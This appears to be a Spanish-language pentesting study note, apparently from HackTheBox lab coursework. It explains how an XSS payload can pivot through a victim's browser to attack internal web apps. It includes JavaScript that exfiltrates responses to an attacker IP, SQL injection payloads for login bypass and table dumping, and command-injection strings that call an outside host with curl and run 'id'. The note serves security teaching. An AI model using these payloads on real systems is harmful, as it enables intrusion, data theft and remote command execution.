---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-08
Nota previa: "[[02 - Enumeración de APIs internas]]"
Nota siguiente: "[[04 - Content Security Policy (CSP)]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

Un paso más allá de [[02 - Enumeración de APIs internas|enumerar APIs internas]]: usar el XSS para **identificar y explotar vulnerabilidades** en aplicaciones internas completas que el atacante no alcanza. <mark style="background: #FFB86CA6;">El navegador de la víctima es el pivote: ejecuta el payload, llega a la app interna y nos devuelve los resultados</mark>. La metodología es siempre la misma; cambia la vulnerabilidad del objetivo.

# Metodología

1. Exfiltrar el `index` de la app interna (referenciada desde el panel admin) para ver con qué tratamos — un login, un formulario, un panel.
2. Reconstruir las peticiones que la app espera (analizando su HTML) y enviarlas desde el payload.
3. Identificar la vulnerabilidad probando entradas y observando las respuestas exfiltradas.
4. Explotarla a través del payload, exfiltrando cada resultado.

<mark style="background: #FFB8EBA6;">Todo requiere que la app interna tenga una configuración CORS que permita a la app vulnerable leer sus respuestas</mark> (o una misconfig); si no, la Same-Origin Policy frena la lectura, igual que con las APIs.

# Ejemplo 1: XSS → SQL injection

La app interna es un login. Lo primero es probar una comilla en el usuario para detectar [[00 - Introducción a SQL Injection|SQL injection]], exfiltrando la respuesta:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);
```

Un `HTTP 500 - SQL Error` confirma la inyección. A partir de ahí se explota como cualquier SQLi, solo que **cada payload viaja dentro del XSS**. Auth bypass:

```js
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
```

Y volcado de datos — en este caso una base `SQLite`, enumerando `sqlite_master`:

```js
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master WHERE type='table'-- -")}&pass=x`;
// luego: ...group_concat(sql) FROM sqlite_master WHERE name='users'  (esquema)
// luego: ...UNION SELECT id,username,password,info FROM users        (datos)
```

<mark style="background: #FF5582A6;">El XSS convierte un SQLi en una app sin exposición externa en explotable</mark>. El detalle de la explotación SQLi (detección del SGBD, UNION, número de columnas) está en su [[00 - Introducción a SQL Injection|sub-tema dedicado]].

# Ejemplo 2: XSS → command injection

Otra app interna comprueba el estado de URLs. Probando un dominio inexistente, la respuesta exfiltrada delata que usa `curl` por detrás:

```text
curl: (6) Could not resolve host: doesnotexist.htb
```

<mark style="background: #8000E1A6;">Un comando del sistema construido con entrada del usuario huele a `command injection`</mark>. Lo confirmamos inyectando un segundo comando que llame a nuestro servidor:

```js
var params = `webapp_selector=${encodeURIComponent("| curl -k https://10.10.14.144:4443?pwn")}`;
```

Si llega la petición a nuestro servidor, hay ejecución de comandos. El separador que funcione (`|`, `;`, `&&`, `$()`, backticks) depende de cómo concatene la entrada la app —dentro de comillas, como argumento de una opción, etc.—, así que conviene probar varios. A partir de ahí se explota como cualquier [[Command Injection|command injection]], exfiltrando la salida:

```js
var params = `webapp_selector=${encodeURIComponent("| id")}`;
// respuesta exfiltrada: uid=0(root) gid=0(root) groups=0(root)
```

> [!important]+ El patrón general: XSS como proxy de explotación
> Las dos cadenas son el mismo patrón: <mark style="background: #FFB86CA6;">el XSS es un proxy que ejecuta tu ataque desde dentro de la red de la víctima</mark>. Cualquier vulnerabilidad web —SQLi, command injection, SSRF, deserialización— se vuelve explotable en hosts internos si un usuario con acceso dispara tu payload. El reto técnico es siempre el mismo: respetar la Same-Origin Policy / CORS para poder **leer** las respuestas, y exfiltrarlas con cuidado de OPSEC.

Hasta aquí hemos asumido que el payload XSS ejecuta sin trabas. En aplicaciones reales hay dos barreras grandes que sortear: la `Content Security Policy` y los filtros de entrada. Empezamos por la CSP: [[04 - Content Security Policy (CSP)]].

> [!info]+ Fuentes de referencia
> - [Advanced SQL Injections (HTB)](https://academy.hackthebox.com/module/details/188) — explotación SQLi en profundidad
> - [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
